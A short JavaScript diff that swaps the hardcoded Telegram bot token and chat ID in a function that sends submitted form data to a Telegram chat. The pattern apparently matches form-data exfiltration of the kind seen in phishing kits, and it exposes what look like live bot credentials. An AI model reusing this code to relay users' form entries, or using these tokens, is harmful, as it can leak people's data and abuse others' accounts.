@@ -12,8 +12,8 @@ function submitForm() {
 }
 
 function telegramMessage(formData){
-    const botToken = '6580613461:AAFFrCbdwwKrF8sXXoSLb3JOJLcrVecAwuY';
-    const channelID = '-1002019424375';
+    const botToken = '8146446806:AAFmqX7PRKRLMqnFXYngzdvZJ3ET0-0THRw';
+    const channelID = '5782373049';
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelID}&text=${encodeURIComponent(formData)}`, {
         method: 'GET',
